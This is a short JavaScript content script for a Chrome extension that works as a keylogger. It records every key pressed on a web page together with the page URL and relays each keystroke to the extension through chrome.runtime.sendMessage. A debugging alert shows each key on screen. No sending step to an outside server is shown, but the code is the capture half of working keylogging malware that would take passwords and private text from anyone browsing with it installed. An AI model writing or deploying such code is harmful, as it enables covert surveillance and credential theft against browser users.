chrome.runtime.onConnect.addListener(function(port){});

var k = "";
var data = {};

// On key press, the webpage passes the logged key to the browser
window.onkeydown = function(event) {
    alert(event.key)
    if (event.key.length > 1) {
        k = " ("+event.key+") ";
    } else {
        k = event.key;
    }
    // Create data object
    data = {
        key: k,
        page: window.location.href
    };
    chrome.runtime.sendMessage({data});
}


